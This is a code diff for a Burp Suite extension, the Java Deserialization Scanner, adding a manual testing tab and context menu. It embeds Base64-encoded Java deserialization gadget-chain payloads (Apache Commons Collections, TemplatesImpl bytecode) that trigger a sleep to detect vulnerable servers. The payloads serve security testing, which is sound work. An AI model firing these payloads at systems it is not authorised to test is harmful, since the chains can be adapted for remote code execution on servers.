@@ -1,5 +1,9 @@
 package burp;
 
+import java.awt.Component;
+import java.awt.GridLayout;
+import java.awt.event.ActionEvent;
+import java.awt.event.ActionListener;
 import java.io.PrintWriter;
 import java.util.ArrayList;
 import java.util.Arrays;
@@ -9,10 +13,27 @@ import java.util.List;
 import java.util.Set;
 import java.util.concurrent.TimeUnit;
 
+import javax.swing.Box;
+import javax.swing.BoxLayout;
+import javax.swing.JButton;
+import javax.swing.JCheckBox;
+import javax.swing.JComboBox;
+import javax.swing.JLabel;
+import javax.swing.JMenuItem;
+import javax.swing.JPanel;
+import javax.swing.JScrollPane;
+import javax.swing.JSplitPane;
+import javax.swing.JTable;
+import javax.swing.JTextArea;
+import javax.swing.JTextField;
+import javax.swing.SwingUtilities;
+import javax.swing.text.Highlighter;
+import javax.swing.text.Highlighter.Highlight;
+
 import org.apache.commons.codec.binary.Base64;
 import org.apache.commons.lang3.ArrayUtils;
 
-public class BurpExtender implements IBurpExtender, IScannerCheck {
+public class BurpExtender implements IBurpExtender, IScannerCheck, ITab, ActionListener, IContextMenuFactory {
 	
     private IBurpExtenderCallbacks callbacks;
     private IExtensionHelpers helpers;
@@ -35,15 +56,30 @@ public class BurpExtender implements IBurpExtender, IScannerCheck {
     private String passiveScanSeverity;
     private String passiveScanConfidence;
     private String passiveScanIssueDetail;
-    private String passiveScanRemediationDetail;    
+    private String passiveScanRemediationDetail; 
+    
+    private JPanel mainPanel;
+    private JSplitPane splitPane;
+    private JTextArea requestArea;
+    private JTextField host;
+    private JTextField port;
+    private JCheckBox useHttps;
+    private JTextArea resultArea;
+    private JCheckBox enableActiveScanChecks;
+    //private JCheckBox aggressiveMode;
+    private JCheckBox verboseMode;
+    private JCheckBox addManualIssueToScannerResult;
+    
+    private IHttpRequestResponse[] selectedItems;
+    
         
     /*
      * TODO
      * - This version active check for Deserialization Vulnerability IF AND ONLY IF
      * the base value is already a serialized Java Object. Maybe can be useful to add
      * a further mode in which the vulnerability is checked on every parameter, despite
-     * on its base value.
-     * - Maybe search also in headers (I don't know if Burp set all headers as intertion
+     * on its base value (Aggressive mode).
+     * - Maybe search also in headers (I don't know if Burp set all headers as insertion
      * points...)
      */    
     
@@ -62,11 +98,14 @@ public class BurpExtender implements IBurpExtender, IScannerCheck {
         // Register ourselves as a custom scanner check
         callbacks.registerScannerCheck(this);
         
+        //register to produce options for the context menu
+        callbacks.registerContextMenuFactory(this);
+        
         // Initialize stdout and stderr
         stdout = new PrintWriter(callbacks.getStdout(), true);
         stderr = new PrintWriter(callbacks.getStderr(), true);  
         
-        // Initialize the payloads
+        // Initialize the payloads (MUST BE ENCODED IN BASE64 URL SAFE)
         payloads = new HashMap<String,byte[]>();
         payloads.put("Apache Commons Collections 3", Base64.decodeBase64("rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcQB+AABzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAARzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEGphdmEubGFuZy5UaHJlYWQAAAAAAAAAAAAAAHhwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnZva2VyVHJhbnNmb3JtZXKH6P9re3zOOAIAA1sABWlBcmdzdAATW0xqYXZhL2xhbmcvT2JqZWN0O0wAC2lNZXRob2ROYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJ0AAVzbGVlcHVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAXZyAARsb25nAAAAAAAAAAAAAAB4cHQACWdldE1ldGhvZHVxAH4AHgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+AB5zcQB+ABZ1cQB+ABsAAAACdXEAfgAeAAAAAXEAfgAhdXEAfgAbAAAAAXNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAnEHQABmludm9rZXVxAH4AHgAAAAJ2cgAQamF2YS5sYW5nLk9iamVjdAAAAAAAAAAAAAAAeHB2cQB+ABtzcQB+ABFzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHEAfgAsAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHh2cgASamF2YS5sYW5nLk92ZXJyaWRlAAAAAAAAAAAAAAB4cHEAfgA5"));
         payloads.put("Apache Commons Collections 3 Alternate payload", Base64.decodeBase64("rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcQB+AABzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAJzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAPm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnN0YW50aWF0ZVRyYW5zZm9ybWVyNIv0f6SG0DsCAAJbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAXNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzcQB+ABhMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAJ1cgACW0Ks8xf4BghU4AIAAHhwAAAGPMr+ur4AAAAyADMHADEBADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQHAAQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwAGAQAUamF2YS9pby9TZXJpYWxpemFibGUBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAAY8aW5pdD4BAAMoKVYBAARDb2RlCgADABAMAAwADQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBADVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHABkBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhAQAMSW5uZXJDbGFzc2VzBwAnAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAg8Y2xpbml0PgEAEGphdmEvbGFuZy9UaHJlYWQHACoBAAVzbGVlcAEABChKKVYMACwALQoAKwAuAQANU3RhY2tNYXBUYWJsZQEAHnlzb3NlcmlhbC9Qd25lcjI2NzQwMzEyODkyMDY4NgEAIEx5c29zZXJpYWwvUHduZXIyNjc0MDMxMjg5MjA2ODY7ACEAAQADAAEABQABABoABwAIAAEACQAAAAIACgAEAAEADAANAAEADgAAAC8AAQABAAAABSq3AA+xAAAAAgARAAAABgABAAAAJQASAAAADAABAAAABQATADIAAAABABUAFgACABcAAAAEAAEAGAAOAAAAPwAAAAMAAAABsQAAAAIAEQAAAAYAAQAAACgAEgAAACAAAwAAAAEAEwAyAAAAAAABABoAGwABAAAAAQAcAB0AAgABABUAHgACABcAAAAEAAEAGAAOAAAASQAAAAQAAAABsQAAAAIAEQAAAAYAAQAAACsAEgAAACoABAAAAAEAEwAyAAAAAAABABoAGwABAAAAAQAfACAAAgAAAAEAIQAiAAMACAApAA0AAQAOAAAAIgADAAIAAAANpwADAUwRJxCFuAAvsQAAAAEAMAAAAAMAAQMAAgAjAAAAAgAkACUAAAAKAAEAAQAmACgACXVxAH4AIwAAAdTK/rq+AAAAMgAbBwACAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28HAAQBABBqYXZhL2xhbmcvT2JqZWN0BwAGAQAUamF2YS9pby9TZXJpYWxpemFibGUBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAAY8aW5pdD4BAAMoKVYBAARDb2RlCgADABAMAAwADQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQEADElubmVyQ2xhc3NlcwcAGQEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBAANGb28AIQABAAMAAQAFAAEAGgAHAAgAAQAJAAAAAgAKAAEAAQAMAA0AAQAOAAAALwABAAEAAAAFKrcAD7EAAAACABEAAAAGAAEAAAAvABIAAAAMAAEAAAAFABMAFAAAAAIAFQAAAAIAFgAXAAAACgABAAEAGAAaAAlwdAAEUHducnB3AQB4dXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAABdnIAHWphdmF4LnhtbC50cmFuc2Zvcm0uVGVtcGxhdGVzAAAAAAAAAAAAAAB4cHNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHh2cgASamF2YS5sYW5nLk92ZXJyaWRlAAAAAAAAAAAAAAB4cHEAfgAu"));
@@ -108,11 +147,131 @@ public class BurpExtender implements IBurpExtender, IScannerCheck {
 				  					   " resolveClass method, by inserting checks on the object type"+
 				  					   " before deserializing the received object.";  
         
-        stdout.println("Java Deserialization Scanner v0.1");
+        stdout.println("Java Deserialization Scanner v0.2");
         stdout.println("Created by: Federico Dotta");
+        stdout.println("");
+        stdout.println("Supported chains:");
+        stdout.println("Apache Commons Collections 3 (two different chains)");
+        stdout.println("Apache Commons Collections 4 (two different chains)");
+        stdout.println("Spring");
+        stdout.println("Java 6 and Java 7 (<= jdk7u21)");
         stdout.println("");
         stdout.println("Github: https://github.com/federicodotta/Java-Deserialization-Scanner");
         stdout.println("");
+        
+        SwingUtilities.invokeLater(new Runnable() 
+        {
+            @Override
+            public void run()
+            {
+            	
+            	mainPanel = new JPanel();
+            	mainPanel.setLayout(new BoxLayout(mainPanel, BoxLayout.PAGE_AXIS));
+                // main split pane
+                splitPane = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);
+                
+                // LEFT
+                JPanel leftPanel = new JPanel();
+                leftPanel.setLayout(new BoxLayout(leftPanel, BoxLayout.Y_AXIS));
+                
+                JPanel httpServicePanel = new JPanel();
+                httpServicePanel.setLayout(new BoxLayout(httpServicePanel, BoxLayout.X_AXIS));
+                JLabel hostLabel = new JLabel("Host:");
+                host = new JTextField(70);
+                host.setMaximumSize( host.getPreferredSize() );
+                JLabel portLabel = new JLabel("Port:");
+                port = new JTextField(5);
+                port.setMaximumSize( port.getPreferredSize() );
+                //JLabel useHttpsLabel = new JLabel("Https:");
+                useHttps = new JCheckBox("Https");
+                httpServicePanel.add(hostLabel);
+                httpServicePanel.add(host);
+                httpServicePanel.add(portLabel);
+                httpServicePanel.add(port);
+                httpServicePanel.add(useHttps);    
+                
+                requestArea = new JTextArea();
+                JScrollPane scrollRequestArea = new JScrollPane(requestArea);
+                scrollRequestArea.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_AS_NEEDED);
+                
+                JPanel buttonPanel = new JPanel();
+                buttonPanel.setLayout(new BoxLayout(buttonPanel, BoxLayout.X_AXIS));
+                
+                JButton setInsertionPointButton = new JButton("Set Insertion Point");
+                setInsertionPointButton.setActionCommand("setInsertionPoint");
+                setInsertionPointButton.addActionListener(BurpExtender.this);   	 
+                
+                JButton clearButton = new JButton("Clear Insertion Point");
+                clearButton.setActionCommand("clear");
+                clearButton.addActionListener(BurpExtender.this); 
+                
+                JButton attackButton = new JButton("Attack");
+                attackButton.setActionCommand("attack");
+                attackButton.addActionListener(BurpExtender.this);  
+                
+                JButton attackBase64Button = new JButton("Attack (Base64)");
+                attackBase64Button.setActionCommand("attackBase64");
+                attackBase64Button.addActionListener(BurpExtender.this);  
+                
+                buttonPanel.add(setInsertionPointButton);
+                buttonPanel.add(clearButton);
+                buttonPanel.add(attackButton);
+                buttonPanel.add(attackBase64Button);
+                
+                leftPanel.add(httpServicePanel);
+                leftPanel.add(scrollRequestArea);
+                leftPanel.add(buttonPanel);                
+                
+                splitPane.setLeftComponent(leftPanel);                
+                
+                // RIGHT
+                JPanel rigthPanel = new JPanel();
+                rigthPanel.setLayout(new BoxLayout(rigthPanel, BoxLayout.Y_AXIS));
+                
+                JSplitPane rightSplitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
+                
+                resultArea = new JTextArea();
+                resultArea.setEditable(false);
+                resultArea.setText("Results:\n\n");
+                JScrollPane scrollResultArea = new JScrollPane(resultArea);
+                scrollResultArea.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_AS_NEEDED);
+                rightSplitPane.setTopComponent(scrollResultArea);
+                
+                JPanel configurationPanel = new JPanel();
+                configurationPanel.setLayout(new BoxLayout(configurationPanel, BoxLayout.Y_AXIS));
+                JLabel configurationLabel = new JLabel("Plugin configurations:");
+                enableActiveScanChecks = new JCheckBox("Enable active scan checks");
+                enableActiveScanChecks.setSelected(true);
+                enableActiveScanChecks.setActionCommand("enableDisableActiveScanChecks");
+                enableActiveScanChecks.addActionListener(BurpExtender.this);
+                //aggressiveMode = new JCheckBox("Aggressive mode (increase a lot the requests)");
+                verboseMode = new JCheckBox("Verbose mode");
+                addManualIssueToScannerResult = new JCheckBox("Add manual issues to scanner results");
+                addManualIssueToScannerResult.setSelected(true);
+                configurationPanel.add(configurationLabel);
+                configurationPanel.add(enableActiveScanChecks);
+                //configurationPanel.add(aggressiveMode);
+                configurationPanel.add(verboseMode);
+                configurationPanel.add(addManualIssueToScannerResult);
+                rightSplitPane.setBottomComponent(configurationPanel);
+                
+                rightSplitPane.setResizeWeight(0.85);
+                
+                rigthPanel.add(rightSplitPane);
+                
+                splitPane.setRightComponent(rigthPanel);
+                
+                splitPane.setResizeWeight(0.65);
+                
+                mainPanel.add(splitPane);               
+                
+                callbacks.customizeUiComponent(mainPanel);
+                                
+                // add the custom tab to Burp's UI
+                callbacks.addSuiteTab(BurpExtender.this);
+                
+            }
+        });            
         
     }
     
@@ -347,6 +506,257 @@ public class BurpExtender implements IBurpExtender, IScannerCheck {
         }
         
     }
+
+
+	@Override
+	public String getTabCaption() {
+		return "Deserialization Scanner";
+	}
+
+
+	@Override
+	public Component getUiComponent() {
+		return mainPanel;
+	}
+
+
+	@Override
+	public void actionPerformed(ActionEvent event) {
+
+		String command = event.getActionCommand();
+		
+		if(command.equals("attack")) {
+			
+			
+			Thread t = new Thread() {
+			    public void run() {
+			    	executeManualTest(false);
+			    }
+			};
+			t.start();
+			
+			/*
+			try {
+				t.join();
+			} catch (InterruptedException e) {
+				
+				stderr.println(e.toString());
+			}
+			*/
+			
+		} else if(command.equals("attackBase64")) {
+		
+			Thread t = new Thread() {
+			    public void run() {
+			    	executeManualTest(true);
+			    }
+			};
+			t.start();
+			
+			/*
+			try {
+				t.join();
+			} catch (InterruptedException e) {
+				
+				stderr.println(e.toString());
+			}
+			*/
+		
+		} else if(command.equals("setInsertionPoint")) {
+			
+			insertInjectionCharacters();
+			
+		} else if(command.equals("clear")) {
+			
+			clearInsertionPoint();
+			
+		} else if(command.equals("sendToDeserializationTester")) {
+			
+			sendToDeserializationTester();
+			
+		} else if(command.equals("enableDisableActiveScanChecks")) {
+			
+			enableDisableActiveScanChecks();
+			
+		}
+		
+		
+	}	
+	
+	public void enableDisableActiveScanChecks() {
+		
+		if(enableActiveScanChecks.isSelected()) {
+			
+			callbacks.registerScannerCheck(this);
+			
+		} else {
+			
+			callbacks.removeScannerCheck(this);
+			
+		}
+				
+	}
+	
+	public void clearInsertionPoint() {
+		
+		requestArea.setText(requestArea.getText().replace("§",""));
+				
+	}
+	
+	public void sendToDeserializationTester() {
+		
+		IHttpService httpService = selectedItems[0].getHttpService();
+		byte[] request = selectedItems[0].getRequest();
+		
+		host.setText(httpService.getHost());
+		port.setText(Integer.toString(httpService.getPort()));
+		
+		if(httpService.getProtocol().equals("https")) {
+			useHttps.setSelected(true);
+		} else {
+			useHttps.setSelected(false);
+		}
+		
+		requestArea.setText(new String(request));
+		
+	}
+	
+	public void insertInjectionCharacters() {
+		
+		Highlight[] highlights = requestArea.getHighlighter().getHighlights();
+		
+		int start = highlights[0].getStartOffset();
+		int end = highlights[0].getEndOffset();
+		
+		String requestString = requestArea.getText().trim();
+		
+		String newRequestString = requestString.substring(0, start) + "§" + requestString.substring(start, end) + "§" + requestString.substring(end, requestString.length());
+		
+		requestArea.setText(newRequestString);
+		
+	}
+	
+	
+	public void executeManualTest(boolean base64) {		
+		
+		String requestString = requestArea.getText().trim();
+		int payloadFrom = requestString.indexOf('§');
+		int payloadTo = requestString.lastIndexOf('§');
+		
+		boolean positiveResult = false;
+		
+		if(payloadFrom != payloadTo) {
+			
+			IHttpService httpService = helpers.buildHttpService(host.getText().trim(), Integer.parseInt(port.getText().trim()), useHttps.isSelected());
+			
+			byte[] prePayloadRequest =  Arrays.copyOfRange(requestString.getBytes(), 0, payloadFrom);
+			byte[] postPayloadRequest = Arrays.copyOfRange(requestString.getBytes(), payloadTo+1, requestString.getBytes().length);
+			
+			Set<String> payloadKeys = payloads.keySet();
+    		Iterator<String> iter = payloadKeys.iterator();
+    		String currentKey;
+    		
+    		resultArea.setText("Results:\n\n");
+    		
+    		while (iter.hasNext()) {
+			
+    			currentKey = iter.next();    			
+    			
+    			byte[] request;
+    			
+    			if(!base64) {
+    				request = ArrayUtils.addAll(prePayloadRequest,payloads.get(currentKey));
+    			} else {
+    				request = ArrayUtils.addAll(prePayloadRequest,Base64.encodeBase64URLSafe(payloads.get(currentKey)));
+    			}
+    			
+    			request = ArrayUtils.addAll(request,postPayloadRequest);
+    			    			
+    			IRequestInfo requestInfo = helpers.analyzeRequest(request);
+    			List<String> headers = requestInfo.getHeaders();
+    			byte[] body = Arrays.copyOfRange(request, requestInfo.getBodyOffset(), request.length);
+    			request = helpers.buildHttpMessage(headers, body); 			
+    		    			
+    			long startTime = System.nanoTime();
+    			IHttpRequestResponse requestResponse = callbacks.makeHttpRequest(httpService, request);
+    			long endTime = System.nanoTime();
+        		    			
+        		long duration = TimeUnit.SECONDS.convert((endTime - startTime), TimeUnit.NANOSECONDS);
+        		   
+        		resultArea.append("*** " + currentKey + ": ");       		
+        		
+        		if(((int)duration) >= 10){
+        			
+        			positiveResult = true;
+        			
+        			resultArea.append("Potentially VULNERABLE!!!\n");
+        			
+        			if(addManualIssueToScannerResult.isSelected()) {
+        				
+        				List<int[]> requestMarkers = new ArrayList<int[]>();
+        				requestMarkers.add(new int[] {payloadFrom,requestResponse.getRequest().length - postPayloadRequest.length});
+        				
+        				callbacks.addScanIssue(new CustomScanIssue(
+        						requestResponse.getHttpService(),
+                                helpers.analyzeRequest(requestResponse).getUrl(), 
+                                new IHttpRequestResponse[] { callbacks.applyMarkers(requestResponse, requestMarkers, new ArrayList<int[]>()) }, 
+                                (base64) ? (activeScanIssue + currentKey + " (encoded in Base64)") : (activeScanIssue + currentKey),
+                                activeScanSeverity,
+                                activeScanConfidence,
+                                activeScanIssueDetail + currentKey + ".",
+                                activeScanRemediationDetail));   				
+        				
+        			}
+        			
+        		} else {
+        			
+        			resultArea.append("NOT vulnerable!!!\n");
+        			
+        		}
+        		
+        		if(verboseMode.isSelected()) {
+        			resultArea.append("Request:\n");
+        			resultArea.append(new String(requestResponse.getRequest()));
+        			resultArea.append("\n\nResponse:\n");
+        			resultArea.append(new String(requestResponse.getResponse()));
+        			resultArea.append("\n\n");
+        		}
+        		
+    		}
+    			
+    		resultArea.append("\nEND");
+    		
+    		if(positiveResult) {
+    			
+    			resultArea.append("\n\n\nIMPORTANT NOTE: High delayed networks may produce false positives!");
+    			
+    		}
+    		
+
+			
+		} else {
+			
+			resultArea.setText("MISSING ENTRY POINTS");
+			
+		}
+		
+	}
+
+
+	@Override
+	public List<JMenuItem> createMenuItems(IContextMenuInvocation invocation) {
+		
+		selectedItems = invocation.getSelectedMessages();		
+		
+		List<JMenuItem> menu = new ArrayList<JMenuItem>();
+		
+		JMenuItem newItem = new JMenuItem("Send request to Deserialization Scanner");
+		newItem.setActionCommand("sendToDeserializationTester");
+		newItem.addActionListener(this);
+		menu.add(newItem);
+		
+		return menu;
+	}
 
  	
 }
